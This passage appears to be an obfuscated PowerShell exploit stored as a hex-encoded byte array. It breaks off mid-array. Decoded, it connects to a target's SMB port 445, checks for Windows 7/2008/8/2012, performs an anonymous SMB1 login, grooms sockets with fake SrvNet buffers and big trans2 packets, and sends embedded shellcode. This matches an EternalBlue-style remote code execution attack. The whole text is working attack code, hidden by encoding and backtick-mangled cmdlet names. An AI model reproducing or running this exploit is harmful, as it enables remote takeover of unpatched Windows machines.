,'2c' ,30,78 , 30 ,30 , '2c',30 ,78, 30,30,'2c', 30, 78 ,30,30,'2c' ,30 ,78 , 30,30,'2c', 30 , 78, 30 , 30 ,'2c' , 30, 78,30,30 , '2c' ,30,78, 30, 30,'2c', 30 , 78,30 , 30, '2c' ,30 ,78 , 30,30, '2c' , 30, 78,30 ,30 , '2c', 30, 78, 30, 30, '2c',30 ,78 , 30,30 ,'2c' ,30 , 78 ,30,30 , '2c',30, 78 ,30 , 30 ,'2c', 30, 78, 30 , 30,'2c', 30, 78 ,30,30 ,'2c', 30, 78,30, 30, '2c', 30,78,30, 30 ,'2c',30, 78 ,30, 30,'2c' ,30, 78 , 30, 30 ,'2c', 30 , 78 ,30,30 , '2c' , 30 , 78,30,30, '2c', 30, 78 , 30 ,30 ,'2c', 30 , 78, 30 , 30 , '2c',30, 78 , 30, 30,'2c',30, 78 , 30, 30 ,'2c', 30,78 , 30 , 30 ,'2c' ,30 , 78 , 30 , 30,'2c',30, 78 , 30,30 , '2c', 30 ,78 ,30 , 30,'2c', 30 , 78 ,30 ,30 ,'2c', 30, 78, 30 , 30 ,'2c' , 30,78 ,30 ,30 ,'2c',30 ,78 , 30 ,30, '2c',30, 78,30, 30,'2c' , 30 , 78,30, 30 , '2c' ,30, 78,30,30,'2c' , 30 ,78 ,30,30,'2c' ,30,78 ,30, 30 , '2c', 30 ,78 ,30 ,30 , '2c' ,30 ,78 , 30, 30 , '2c' ,30 , 78,30 , 30,'2c', 30,78,30 ,30 ,'2c', 30,78,30,30 ,'2c' , 30, 78, 30 , 30 ,'2c' , 30,78 ,30,30,'2c' , 30 , 78,30, 30 , '2c', 30 ,78,30,30, '2c',30,78,30 ,30, '2c',30,78,30,30,'2c', 30, 78 ,30 ,30 , '2c',30 , 78 ,30, 30 ,'2c',30, 78 , 30,30 , '2c', 30 , 78 ,30 ,30,'2c' , 30,78 ,30 ,30,'2c' ,30 ,78 ,30, 30, '2c',30,78,30 ,30 , '2c' , 30 ,78 , 30, 30 , '2c',30, 78, 30,30,'2c' ,30,78,30 ,30, '2c',30 ,78 , 30,30 ,'2c' ,30 , 78,30 , 30 , '2c', 30,78 ,30 , 30, '2c', 30 , 78 ,30 , 30, '2c', 30 , 78 , 30,30 , '2c' , 30 , 78,30 , 30 ,'2c' , 30, 78,30 ,30 ,'2c',30, 78 , 30 , 30 ,'2c', 30 ,78 , 30,30,'2c' , 30, 78 ,30,30 ,'2c', 30, 78,30,30, '2c' , 30 ,78,30, 30 ,'2c',30, 78 , 30 , 30, '2c' ,30, 78 ,30 , 30 ,'2c' , 30, 78 ,30 , 30 ,'2c' , 30 , 78, 30 , 30,'2c',30 , 78, 30 ,30, '2c',30, 78 , 30 , 30, '2c',30, 78 ,30, 30, '2c' ,30, 78 , 30,30 , '2c', 30, 78, 30, 30 ,'2c' ,30 ,78 , 30,30,'2c' ,30,78 , 30 , 30 ,'2c' , 30, 78, 30, 30, '2c' , 30,78 ,30 , 30,'2c',30 , 78, 30,30, '2c' , 30, 78,30, 30 , '2c', 30, 78 , 30 ,30 , '2c' , 30 ,78, 30 ,30, '2c',30 ,78, 30 ,30 , '2c' ,30 , 78 , 30,30,'2c',30 ,78 , 30 , 30,'2c' , 30,78 ,30 ,30,'2c', 30 ,78,30 , 30, '2c' , 30 , 78 , 30,30 , '2c', 30 ,78,30 , 30 ,'2c' ,30,78, 30,30, '2c', 30,78, 30 , 30,'2c' ,30,78 ,30, 30,'2c' , 30 ,78, 30 , 30,'2c',30,78 ,30, 30 ,'2c' , 30 , 78,30 ,30 , '2c' ,30,78 ,30,30 ,'2c' ,30 ,78 ,30 ,30 ,'2c' ,30 , 78 ,30, 30 ,'2c', 30 ,78,30, 30 , '2c' ,30 ,78, 30 , 30 , '2c', 30 , 78, 30, 30 , '2c', 30 , 78,30 ,30,'2c' , 30,78 ,30, 30 , '2c' , 30, 78, 30 ,30 , '2c' ,30 ,78 , 30, 30 ,'2c', 30 ,78 ,30,30,'2c',30 , 78 , 30 , 30,'2c',30 , 78, 30 ,30 ,'2c' ,30 ,78, 30 ,30 , '2c', 30,78 ,30, 30 , '2c', 30, 78 , 30 , 30,'2c', 30,78 ,30, 30 , '2c',30 ,78 ,30,30,'2c', 30,78, 30 ,30, '2c', 30 , 78 ,30 , 30 , '2c', 30 , 78, 30 ,30 , '2c',30 ,78 , 30 , 30,'2c', 30 ,78 ,30,30 , '2c',30,78, 30,30 ,'2c', 30 , 78, 30, 30 ,'2c' , 30 , 78 , 30 ,30 , '2c' ,30,78, 30 ,30 ,'2c' , 30,78,30 , 30, '2c', 30 ,78,30, 30,'2c' ,30, 78, 30 , 30, '2c' ,30,78, 30,30 ,'2c',30,78 , 30,30,'2c' ,30 , 78, 30 ,30, '2c' ,30,78 ,30 ,30 ,'2c', 30, 78, 30 ,30,'2c' , 30 ,78,30, 30,'2c', 30,78 ,30 ,30 , '2c' ,30 , 78 ,30, 30,'2c' ,30 , 78, 30, 30 ,'2c',30 , 78 , 30,30 ,'2c', 30,78 , 30, 30 , '2c',30 ,78,30 , 30, '2c',30,78, 30,30 ,'2c' , 30 , 78, 30 , 30, '2c' ,30,78,30,30 , '2c' ,30 ,78 , 30,30 , '2c',30,78 ,30, 30 ,'2c',30 , 78 ,30, 30 ,'2c' , 30, 78, 30,30 , '2c' , 30,78 , 30 , 30, '2c' , 30,78 ,30 ,30 ,'2c', 30 , 78 ,30, 30,'2c',30,78,30,30, '2c', 30 , 78,30 , 30, '2c',30, 78 ,30 ,30, '2c' , 30 ,78, 30 , 30 , '2c' ,30 ,78 ,30, 30 ,'2c' , 30 , 78,30 , 30, '2c', 30,78 ,30 , 30 ,'2c' ,30, 78, 30, 30 , '2c' , 30 ,78, 30,30,'2c', 30 ,78 , 30, 30 ,'2c' , 30 ,78,30 ,30 ,'2c',30 ,78,30 ,30, '2c' ,30, 78,30 ,30 ,'2c',30, 78, 30,30 , '2c' , 30, 78,30,30 , '2c' , 30 , 78 , 30 ,30, '2c' , 30, 78, 39 ,30, '2c',30 ,78 ,66 , 31 , '2c', 30 ,78 ,64, 66, '2c' ,30 , 78 ,66 , 66 , '2c' ,30, 78 ,30,30, '2c' ,30 ,78, 30 , 30,'2c' , 30,78, 30 ,30,'2c',30, 78 ,30 ,30 , '2c', 30 , 78 ,65 , 66 , '2c' ,30,78, 66, 31,'2c', 30, 78 ,64 ,66, '2c', 30,78, 66,66,'2c', 30 , 78,30, 30, '2c' , 30, 78, 30,30 , '2c' , 30 , 78 , 30,30 ,'2c', 30, 78,30 , 30 ,'2c', 30 , 78,30 , 30, '2c' ,30 , 78, 30,30 , '2c' , 30 , 78 ,30,30 ,'2c', 30, 78 , 30,30 ,'2c' , 30 , 78 ,30, 30,'2c',30 ,78, 30,30 ,'2c',30 ,78, 30 ,30 ,'2c' ,30 , 78,30,30,'2c' , 30,78, 30,30, '2c' ,30 , 78 , 30, 30,'2c' ,30 , 78 ,30,30 ,'2c', 30 ,78, 30, 30, '2c' ,30, 78 , 30, 30 ,'2c' ,30 ,78 , 30 , 30, '2c' , 30 , 78,30,30 , '2c', 30,78, 30,30 ,'2c',30,78 ,30 ,30 , '2c', 30 , 78,30,30, '2c' , 30, 78, 30, 30 ,'2c', 30 , 78, 30, 30, '2c',30, 78,30 ,30, '2c',30, 78 , 30 ,30,'2c',30,78 , 30,30, '2c' , 30, 78 ,30 , 30 ,'2c', 30,78 ,30,30,'2c' , 30 ,78,30 , 30, '2c',30 , 78, 30 ,30 , '2c', 30,78, 30,30 ,'2c' ,30 ,78 ,30,30 ,'2c' , 30 , 78, 30 ,30 , '2c' , 30, 78 , 30 ,30,'2c',30, 78 , 30 ,30, '2c' ,30,78 , 30 ,30,'2c' ,30 ,78 ,30 ,30 ,'2c' ,30 , 78, 30 , 30,'2c' ,30,78,30 , 30 ,'2c',30,78, 30 ,30 , '2c' , 30,78, 30 ,30 , '2c',30,78, 30 , 30, '2c' , 30, 78,30, 30 ,'2c' , 30,78 ,30 ,30,'2c' ,30 , 78 ,30, 30 , '2c' ,30 , 78,30,30 , '2c' , 30,78,30,30, '2c', 30 , 78, 30, 30,'2c', 30 , 78 , 30 ,30 ,'2c', 30 , 78 , 30 ,30, '2c',30 ,78,30 ,30 , '2c',30,78, 30,30 ,'2c' , 30 , 78 , 30 ,30 , '2c' , 30, 78 , 30, 30 , '2c', 30, 78, 30, 30,'2c',30 ,78, 30,30 ,'2c' , 30 ,78, 30, 30,'2c', 30 , 78,30, 30, '2c',30, 78 , 30,30,'2c', 30 ,78,30 ,30 ,'2c' ,30 , 78,30 ,30, '2c',30 ,78 , 30,30 ,'2c' ,30 , 78,30 , 30, '2c', 30 ,78,66, 30 , '2c', 30 , 78,30, 31 ,'2c' ,30,78,64,30 ,'2c' ,30 , 78,66, 66,'2c' ,30, 78 ,66 , 66,'2c', 30 , 78 ,66, 66 , '2c', 30 , 78, 66 ,66 ,'2c' , 30 , 78 ,66 ,66,'2c',30 , 78,30 , 30 , '2c' ,30, 78 , 30 ,30, '2c' ,30,78 , 30, 30 ,'2c',30 ,78, 30,30 , '2c' ,30 , 78 , 30 , 30,'2c', 30 , 78,30 ,30,'2c' , 30,78 , 30, 30,'2c', 30, 78,30,30 ,'2c' , 30, 78,66,66 ,'2c',30 ,78, 30,31 ,'2c', 30, 78 , 64 ,30, '2c',30,78,66,66 , '2c' , 30, 78, 66, 66, '2c', 30, 78, 66, 66 ,'2c', 30 , 78 ,66 ,66 ,'2c',30,78, 66,66, 29 ,'d' , 'a', 24 ,63 , '6c', 69, 65 , '6e',74 , 20 ,'3d',20 ,'6e', 65,60, 57,'2d', '4f',60, 42, 60 ,'4a' , 45, 43, 54 , 20 ,53 , 79,73, 74 , 65 , '6d', '2e' ,'4e',65 ,74,'2e', 53,'6f' ,63 ,'6b', 65 ,74, 73, '2e' , 54,63 , 70, 43 , '6c' ,69 , 65, '6e' ,74, 28 ,24,74 ,61,72 , 67 , 65 , 74 ,'2c' ,34, 34 ,35 , 29, 'd','a', 24 , 73,'6f' ,63, '6b', 20, '3d',20 ,24 , 63,'6c' , 69,65,'6e' , 74, '2e', 43 , '6c',69,65 , '6e',74 , 'd' , 'a', 24 , 73,'6f' ,63, '6b', '2e',52,65 , 63,65, 69 , 76,65,54, 69, '6d',65 ,'6f',75,74 , 20 , '3d', 35 ,30 ,30 ,30, 'd','a' , 63, '6c' ,60, 69 ,65,'6e', 60 ,54,60, '5f','4e' , 65 ,47, '4f' , 74 , 49 , 41,74 , 65,28, 24,73 ,'6f' ,63, '6b', 29 , 20 ,'7c', 20 ,'4f', 60, 55 ,54 ,'2d' ,60 ,'4e', 75 , '4c', '4c' ,'d', 'a' , 24 ,72 , 61, 77 , '2c' ,20 ,24 ,73 ,'6d' ,62,68, 65,61, 64,65, 72 , 20, '3d' , 20 ,53,'4d' ,60, 42 ,31,'5f' , 61,60, '4e' , '6f' ,'4e' ,79 ,'6d' ,'4f', 60,55, 60 , 53,'5f', '4c','6f', 60, 67 , 60 , 69 , '4e',20, 24 , 73, '6f',63 , '6b' , 'd','a', 24,'6f' , 73 ,'3d' ,'5b' ,73, 79, 73 , 74,65 , '6d' , '2e' ,54 ,65, 78 ,74, '2e' , 45 , '6e',63,'6f' , 64,69 , '6e' , 67 ,'5d' , '3a','3a',61 ,73 , 63, 69 , 69,'2e' , 47 ,65 , 74 , 53 , 74,72,69,'6e', 67 ,28, 24,72 , 61 , 77, '5b',34 ,35 ,'2e', '2e', 28,24 , 72,61,77 , '2e' , 63 ,'6f' , 75, '6e',74,'2d' , 31, 29 ,'5d' ,29,'2e', 54 , '6f','4c' ,'6f' ,77 , 65,72 ,28, 29 , 'd', 'a', 69 ,66,20, 28, 21,28,28 ,24, '6f' ,73 , '2e',63,'6f','6e' , 74,61, 69,'6e' ,73 , 28 , 28, 27 ,77 , 69,27, '2b' ,27 , '6e',64,'6f' ,27 ,'2b', 27 ,77, 73 ,20,37, 27,29 ,29, 29,20 ,'2d', '6f' , 72, 20,28 , 24,'6f', 73 ,'2e', 63 ,'6f' ,'6e' ,74 ,61, 69, '6e' , 73 , 28, 28,27,77 ,69 , 27,'2b', 27 , '6e',64, 27 ,'2b' , 27,'6f', 77, 73, 27 , 29 ,29, 20,'2d',61,'6e' , 64 ,20,24,'6f' , 73, '2e' , 63,'6f','6e' , 74, 61, 69 ,'6e' , 73 , 28, 28,27 , 32, 27 ,'2b', 27,30, 30 ,38, 27, 29 ,29, 29 , 20,'2d', '6f',72 ,20,28 ,24, '6f' , 73 , '2e',63 ,'6f' , '6e' ,74 , 61,69 , '6e', 73,28 ,28,27 , 77 ,69 ,'6e' ,27 , '2b' , 27, 64 , '6f', 77 , 27, '2b' , 27 ,73 , 20, 76 ,69, 27 , '2b' ,27 , 73 ,74 , 61 ,27,29 ,29,29, 20 ,'2d' , '6f',72 , 20 , 28 , 24, '6f', 73 , '2e',63 , '6f', '6e', 74,61, 69 , '6e' , 73 , 28 ,28,27 ,77 ,27,'2b' , 27 ,69, '6e', 27, '2b', 27,64 ,'6f' , 77,73 ,27, 29,29 ,20 , '2d',61, '6e' , 64, 20, 24 ,'6f',73 , '2e',63 ,'6f' ,'6e', 74, 61 , 69, '6e', 73 ,28 ,28,27 ,32 ,27 ,'2b',27 ,30,31 ,31 , 27 , 29, 29 , 29 ,29 ,29 , 'd' ,'a' , '7b' ,72 , 65 ,74 ,75 , 72,'6e' ,20 ,24 ,46,61, '6c' ,73 ,65 ,'7d' ,'d','a' ,24 , 72 ,61,77,'2c' , 20 , 24,73, '6d' , 62 , 68,65,61, 64, 65 ,72 ,20, '3d' ,20,54 ,72,60 , 65 ,65 , '5f' , 60 ,43,60, '4f' , '6e', '4e' ,65 ,63 ,60, 54 ,'5f',61 ,60 ,'4e' ,64 , 58 ,20 ,24, 73,'6f' ,63 ,'6b' , 20,24 ,74,61, 72, 67,65, 74, 20 ,24 , 73 ,'6d' ,62, 68 ,65,61,64, 65,72, '2e' , 75, 73 , 65 ,72 ,'5f',69, 64 ,'d' ,'a' ,'d', 'a' ,24 ,70, 72,'6f',67, 72 ,65,73 , 73, 20 , '2c',20, 24 ,74, 69,'6d' ,65 , '6f' , 75, 74 ,'3d',20,73, 65,'4e' , 44 , '5f', 62 ,49, 47 ,'5f', 54,60,52 ,60,41 ,60 , '4e' , 53 ,32,20,24 , 73 , '6f',63,'6b' ,20,24,73 , '6d', 62 , 68 , 65 , 61, 64 ,65 , 72,20 , 24 ,66,65 , 61 ,'4c' ,69, 73 , 74 ,20 , 32,30 ,30 , 30,20 , 24,46 ,61 , '6c' ,73 ,65 , 'd' , 'a' ,24,61, '6c', '6c','6f' , 63 , 43,'6f', '6e','6e' , 20 ,'3d', 20, 43,60 , 52 ,65,41 , 54 , 60 , 65, 73 , 65, 60 , 73,53 , 49, '4f', '6e' ,60, 41,60 ,'6c', '6c', '4f',60 ,63 ,'6e','4f' , '6e' , 70 ,41 ,47 , 45, 64,20 ,24 ,74,61 , 72, 67 ,65 ,74, 20 ,28,24,'4e' , 54,46 ,45,41 , '5f',53,49, '5a', 45,20 ,'2d',20, 30 ,78 , 31,30 , 31,30 ,29,'d','a' ,24,70,61 ,79, '6c' ,'6f', 61, 64, '5f', 68 , 64, 72,'5f' , 70 , '6b',74, 20,'3d' ,20, '6d' , 61,'4b' , 45, '5f' ,73 ,60,'4d',62, 60, 32 ,'5f' ,70, 61 , 60, 79, '6c' , 60,'4f' ,41 ,44 , '5f',68 , 45 ,61,44, 65, 60, 52 ,73,'5f', 50 , 41,60 , 63,60, '4b',65 ,54,'d' , 'a' ,24,67 , 72 , '6f', '6f' ,'6d' ,'5f',73 ,'6f' ,63 ,'6b' ,73 ,20 , '3d',40,28, 29 ,'d' ,'a' , 66 , '6f' , 72 , 20, 28 ,24 , 69,'3d' ,30 ,'3b',20 ,24 ,69,20, '2d','6c',74, 20,31, 33 , '3b', 20,24,69,'2b', '2b' , 29,'d','a' ,'7b','d' ,'a',24 ,63 , '6c',69 , 65,'6e' ,74,20 , '3d' ,20 ,'6e' ,65,60, 77 , '2d' ,'6f' ,42 , '6a' ,60 , 45 ,63 ,74, 20, 53,79, 73 ,74 , 65 , '6d','2e' ,'4e', 65 ,74 ,'2e', 53,'6f' ,63 , '6b',65, 74, 73 , '2e' , 54 ,63 ,70 , 43 ,'6c' ,69, 65, '6e' , 74, 28 ,24 , 74 , 61, 72 ,67 ,65, 74,'2c',34, 34,35, 29,'d','a' ,24 ,67,73, '6f' ,63, '6b', 20, '3d' , 20, 24, 63, '6c' ,69, 65, '6e' ,74 , '2e' , 43,'6c' ,69 ,65,'6e' ,74,'d','a' , 24, 67 , 72 ,'6f','6f','6d' ,'5f', 73 ,'6f' , 63,'6b' , 73 ,20, '2b','3d', 20,24 , 67 ,73 , '6f' , 63, '6b' ,'d', 'a', 24 , 67 ,73, '6f' ,63,'6b','2e',53 , 65, '6e' ,64 ,28 , 24 , 70, 61,79 ,'6c', '6f' ,61 , 64,'5f' ,68,64 , 72 , '5f', 70, '6b' , 74 , 29,20,'7c',20, '4f' ,55 ,74 , 60 ,'2d','4e' , 55 ,60 , '4c' , '6c' ,'d','a' , '7d','d' ,'a' ,24 , 68 ,'6f' ,'6c',65,43 , '6f', '6e','6e',20 ,'3d',20 ,43 ,72 ,65, 60 ,41 , 74 , 65 ,73,65, 53,53 ,69 , 60 ,'6f' ,'6e', 60,41 ,'4c', '6c','4f', 63 , '6e' ,'6f', '6e' , 50 , 60, 41,67, 65 ,44 ,20, 24, 74, 61 , 72 , 67, 65,74 ,20,28, 24 , '4e' ,54, 46 , 45 ,41 , '5f',53 , 49, '5a' ,45 , 20 , '2d', 20 , 30, 78,31,30 ,29, 'd','a', 24, 61 ,'6c', '6c' , '6f' , 63, 43, '6f' ,'6e' ,'6e', '2e' , 63 ,'6c','6f', 73,65 ,28 ,29, 'd' ,'a',66,'6f', 72 , 20,28 , 24,69,'3d' ,30,'3b' ,20, 24 ,69 ,20 , '2d' ,'6c', 74 , 20 , 35,'3b', 20, 24,69 , '2b', '2b' ,29,'d' ,'a' , '7b' ,'d' ,'a', 24,63 , '6c' , 69 ,65,'6e' , 74,20, '3d', 20 , '4e',45,60, 57 , '2d' , '4f',60 ,42 , '6a' ,65,63,54,20,53 ,79, 73 ,74 , 65 , '6d', '2e' ,'4e', 65,74,'2e' , 53 ,'6f',63 ,'6b' , 65 ,74 , 73,'2e' ,54,63 ,70 ,43 , '6c' ,69 ,65 , '6e' ,74,28, 24,74, 61 , 72, 67 ,65, 74, '2c',34 ,34 , 35, 29,'d' ,'a' , 24,67 ,73 , '6f', 63,'6b', 20 , '3d', 20, 24, 63, '6c', 69,65 , '6e',74, '2e' ,43 ,'6c',69, 65, '6e' ,74,'d', 'a' , 24 , 67 , 72,'6f' , '6f' ,'6d' ,'5f', 73 ,'6f' , 63, '6b',73, 20 ,'2b' , '3d' , 20 , 24 ,67 ,73,'6f',63 ,'6b', 'd' ,'a' ,24 , 67, 73 , '6f' , 63,'6b', '2e' ,53 , 65,'6e',64,28 ,24 ,70, 61 , 79,'6c' , '6f' ,61 , 64 ,'5f' , 68, 64, 72,'5f' ,70 , '6b' , 74 , 29 ,20, '7c' ,20 ,'4f',60 , 55 , 74,'2d' , '4e', 55,'4c','6c' , 'd' ,'a' ,'7d','d','a',24, 68, '6f' ,'6c' , 65,43, '6f' ,'6e' ,'6e' , '2e', 63 ,'6c' , '6f', 73, 65, 28 , 29, 'd', 'a' , 24,74,72,61 , '6e' ,73 , 32 , '5f',70 ,'6b',74,20 ,'3d' ,20 , '6d', 60,41,'6b' , 45, '5f' , 53,'4d' ,42,31 , '5f', 60 , 54 , 72 , 60, 41 ,'6e', 73 , 60, 32 , '5f','6c' ,41,60 , 73 , 74 ,60, '5f',70 ,41 ,63 ,'4b', 65 , 54,20 ,24, 73 , '6d' , 62 , 68, 65, 61, 64 ,65 , 72 , '2e', 74,72, 65, 65, '5f', 69 , 64 ,20, 24,73,'6d', 62 , 68,65, 61 ,64 , 65 , 72 ,'2e',75 , 73 , 65 , 72,'5f' , 69 ,64 , 20 ,24,66, 65,61,'4c',69 ,73, 74 ,'5b', 24,70 , 72 , '6f', 67, 72,65 , 73,73,'2e' ,'2e' ,24 ,66 ,65 ,61 , '4c',69 ,73 ,74 ,'2e' ,63 , '6f', 75 ,'6e' ,74 , '5d', 20 , 24,74 , 69 , '6d' ,65,'6f',75, 74, 'd' , 'a', 24 ,73,'6f', 63,'6b', '2e' ,53 , 65 , '6e' , 64 , 28, 24 ,74 ,72 ,61,'6e',73 , 32, '5f',70,'6b' , 74,29 ,20 , '7c' ,20 , '4f' , 55,74, '2d' ,'4e', 75, 60 ,'6c' , '6c','d' , 'a', 24,72, 61 , 77, '2c', 20 , 24,74,72, 61 , '6e',73 , 32,68 , 65 , 61,64,65 ,72,20 ,'3d', 20 ,73 , '6d', 42 ,31, '5f',67,65 , 60,54, 60,'5f', 72,65 ,60 ,73,70,'4f' , 60 , '4e' ,73 ,65 ,28 ,24,73, '6f' ,63,'6b' , 29, 'd','a' ,66,'6f', 72,65 ,61 ,63 , 68,20 ,28, 24,73 ,'6b', 20 ,69 , '6e' ,20 , 24 ,67 ,72,'6f' ,'6f', '6d','5f' ,73,'6f', 63 , '6b', 73 ,29,'d', 'a' , '7b', 'd' , 'a' , 24,73, '6b' , '2e' , 53, 65, '6e', 64 , 28 ,24, 66,61,'6b', 65, '5f' , 72, 65 ,63, 76, '5f',73 ,74 , 72, 75 , 63, 74 ,20, '2b', 20 ,24 ,73 ,68,65 , '6c' , '6c', 63 ,'6f', 64 , 65,29, 20,'7c' , 20,'6f' , 55,60, 54 ,'2d', '6e' , 60, 55, '4c','6c', 'd' ,'a' , '7d','d', 'a', 66,'6f' ,72,65 , 61,63, 68, 20 , 28, 24 ,73, '6b',20, 69, '6e', 20 ,24, 67, 72,'6f','6f','6d','5f', 73,'6f',63 ,'6b' , 73,29 , 'd','a','7b', 'd' , 'a' ,24 , 73 , '6b','2e', 63,'6c', '6f',73 , 65,28,29 , 20 ,'7c' ,20, '6f' , 75 ,60, 54 , 60 , '2d' , '4e' , 75,'6c' ,'4c', 'd', 'a' ,'7d' , 'd' ,'a' , 24,73,'6f' ,63 , '6b' , '2e' , 43 , '6c','6f' , 73,65, 28, 29, '7c',20 ,'6f' , 75 ,60 , 54 ,60,'2d', '6e' , 75 , '4c', '6c', 'd', 'a', 72, 65 ,74 ,75,72 , '6e' , 20 ,24 , 54, 72 ,75,65,'d' ,'a', '7d','d','a','d','a', 'd' , 'a',66,75,'6e' ,63 , 74 , 69,'6f','6e',20 , 63 , 72 ,65,61 ,74 , 65 , 46 ,61 ,'6b' ,65,53, 72,76 ,'4e', 65,74,42 , 75,66 ,66,65 , 72 ,38 ,28, 24,73 ,63, '5f', 73 ,69 , '7a',65 ,29 ,'d' , 'a' ,'7b', 'd','a' , 20,20 ,20 , 20, 24, 74 , '6f',74 ,61, '6c', 52, 65 , 63 , 76,53,69, '7a',65, 20,'3d', 20,30 ,78 ,38 , 30, 20,'2b',20,30,78 ,31, 38 ,30 ,20, '2b' , 20 , 24 ,73 , 63,'5f',73,69 ,'7a' , 65, 'd','a' , 9 , 24 , 66,61 ,'6b', 65,53, 72, 76 ,'4e',65,74, 42,75 ,66 , 66 ,65,72, 58 , 36,34 , 20, '3d' , 20, '5b',62 ,79 ,74 ,65 , '5b','5d', '5d' ,30, 78, 30, 30 ,'2a' ,31 , 36 , 'd','a' , 9 , 24,66 , 61 , '6b' ,65,53 ,72 , 76, '4e' ,65,74,42, 75 , 66 , 66 ,65 , 72 , 58,36, 34 ,20, '2b' , '3d' , 20 ,30 , 78 ,66 ,30,'2c', 30 ,78,66, 66 ,'2c' ,30, 78,30,30,'2c' ,30, 78 ,30, 30, '2c', 30, 78, 30, 30,'2c',30,78,30 , 30 ,'2c' , 30,78 , 30,30 ,'2c', 30, 78, 30 ,30 ,'2c', 30, 78 , 30 , 30,'2c', 30 ,78, 34,30 , '2c' , 30, 78, 64 , 30,'2c' , 30 ,78 , 66 ,66 ,'2c' , 30,78,66, 66 ,'2c' , 30,78, 66, 66,'2c',30 ,78 ,66 , 66, '2c',30 ,78, 66 ,66 ,'d','a',9, 24 , 66 , 61, '6b' ,65, 53, 72 , 76, '4e' ,65 , 74 ,42,75 ,66,66,65 ,72,58 , 36 , 34,20 , '2b' , '3d' , 20 ,30 , 78,30, 30,'2c',30, 78 ,30 , 30 ,'2c',30, 78 ,30 , 30 ,'2c' ,30 , 78 ,30, 30, '2c' ,30 ,78 ,30 ,30,'2c' , 30,78, 30 ,30, '2c', 30 , 78 , 30,30,'2c' , 30,78, 30 , 30, '2c' , 30, 78,65, 38 ,'2c' ,30 ,78,38, 32,'2c',30 , 78 , 30 ,30 ,'2c', 30 ,78,30,30, '2c' ,30 , 78 ,30,30, '2c',30 , 78,30, 30 ,'2c',30,78,30 , 30, '2c',30 ,78 ,30, 30 ,'d','a' , 9, 24 ,66 ,61 ,'6b' ,65, 53, 72 , 76 , '4e',65 , 74 ,42,75, 66 , 66 ,65 ,72 ,58 , 36 , 34 , 20,'2b','3d' , 20,20, '5b' ,62 ,79 , 74,65 , '5b' ,'5d', '5d' ,30 , 78,30, 30 ,'2a',31 ,36, 'd' ,'a' ,20 ,20 , 20,20 , 24 , 61 ,'3d' ,'5b' ,62 , 69 ,74 , 63,'6f' ,'6e' ,76 ,65 ,72,74 ,65 , 72,'5d' , '3a','3a' , 47, 65 ,74 , 42,79, 74 ,65,73 ,28, 24, 74 ,'6f' , 74, 61,'6c', 52 ,65,63, 76, 53,69, '7a',65,29,'d' ,'a',9 ,24 , 66 , 61 , '6b' ,65 ,53,72, 76 , '4e',65,74 , 42 ,75, 66 , 66 ,65 ,72 ,58 ,36 , 34 ,20,'2b' , '3d',20 , '5b' ,62, 79, 74 , 65, '5b','5d' , '5d' , 30, 78 , 30 ,30,'2a' ,38, '2b' , 24,61 , '2b' , '5b' , 62, 79 ,74,65 ,'5b' , '5d' , '5d' ,30 ,78, 30 ,30,'2a' ,34,'d', 'a',9 ,24, 66, 61 , '6b', 65, 53 ,72 ,76 , '4e', 65,74 ,42 ,75 ,66 ,66, 65 , 72 , 58, 36,34 , 20,'2b' ,'3d' , 20 , 30,78, 30, 30,'2c', 30,78,34 ,30,'2c' ,30,78, 64 ,30, '2c',30 , 78, 66 , 66,'2c' , 30, 78 ,66, 66 , '2c',30,78, 66,66 , '2c', 30 , 78 , 66 ,66, '2c',30 ,78 , 66 ,66, '2c' , 30 , 78, 30, 30, '2c',30 , 78 ,34,30, '2c' ,30 ,78 , 64,30,'2c' ,30,78 , 66,66, '2c' ,30 , 78 , 66, 66,'2c', 30 , 78 ,66,66 , '2c' ,30 ,78 ,66, 66,'2c' ,30 , 78, 66, 66, 'd' , 'a', 9 , 24 , 66,61, '6b' ,65 , 53 ,72 , 76, '4e', 65 ,74 ,42 , 75 , 66 ,66, 65,72 ,58, 36, 34 ,20 , '2b','3d' , 20,'5b' , 62 ,79, 74 , 65, '5b' ,'5d' , '5d', 30 ,78 ,30 , 30 ,'2a' ,34,38, 'd' , 'a' , 9, 24, 66 , 61 ,'6b',65 , 53 ,72 , 76 ,'4e', 65 , 74 ,42,75 ,66,66 , 65, 72,58,36,34, 20 , '2b', '3d' ,20 , 30 , 78, 30,30,'2c',30, 78 , 30, 30 , '2c' , 30, 78 ,30, 30 , '2c', 30 , 78 ,30,30, '2c',30, 78 ,30, 30 , '2c' ,30,78 ,30 ,30, '2c', 30 , 78,30, 30,'2c', 30, 78, 30 ,30, '2c' , 30,78, 36 ,30, '2c', 30,78 , 30 ,30, '2c' , 30 , 78 , 30 ,34, '2c', 30 ,78 , 31, 30 ,'2c' , 30 ,78, 30 , 30, '2c' , 30 ,78, 30 ,30 ,'2c' ,30,78 ,30 , 30,'2c',30 ,78,30 ,30 ,'d' ,'a' , 9, 24 ,66,61, '6b', 65,53 ,72,76, '4e', 65 , 74 ,42, 75 ,66,66 ,65 ,72,58 , 36 , 34, 20, '2b', '3d', 20 , 30,78 ,30 ,30 ,'2c' , 30 , 78 ,30,30,'2c',30 , 78, 30,30, '2c' , 30,78, 30, 30, '2c' , 30 , 78 , 30, 30 ,'2c' ,30 , 78 , 30 ,30 ,'2c',30, 78 , 30 ,30,'2c' ,30 , 78,30,30 , '2c', 30,78 ,38 , 30, '2c' ,30, 78 , 33 , 66,'2c', 30 ,78,64 ,30 , '2c', 30 , 78 , 66, 66 ,'2c' ,30 ,78, 66,66 , '2c',30,78,66, 66 ,'2c' , 30, 78 ,66 ,66 ,'2c', 30 ,78, 66, 66 ,'d', 'a' , 9 , 72,65 , 74,75, 72, '6e' , 20 ,24 ,66 ,61,'6b' ,65 ,53, 72, 76,'4e' ,65, 74 ,42 ,75 ,66 , 66 , 65 , 72 , 58 , 36 , 34 ,'d','a','7d','d' , 'a', 'd','a' ,66,75 , '6e',63, 74 , 69,'6f','6e',20, 63, 72 , 65, 61, 74 , 65 ,46 , 65, 61 ,'4c' , 69 ,73 , 74 ,38 ,28, 24,73, 63 ,'5f' ,73,69,'7a',65 , '2c' , 20, 24,'6e', 74 , 66 ,65 ,61 , 29 ,'7b', 'd', 'a', 9, 24 , 66 ,65 , 61,'4c', 69 ,73 ,74,20, '3d' ,20, 30, 78 , 30 ,30 , '2c', 30 ,78 ,30 ,30 , '2c' ,30, 78 , 30 ,31,'2c',30, 78, 30,30,'d' , 'a', 9 , 24 , 66 , 65 , 61 , '4c' ,69 , 73,74 ,20,'2b' , '3d' , 20 , 24, '6e' , 74,66 , 65,61, 'd', 'a',9 , 24,66 ,61 ,'6b' ,65,53 , 72 , 76,'4e',65,74 ,42 , 75 , 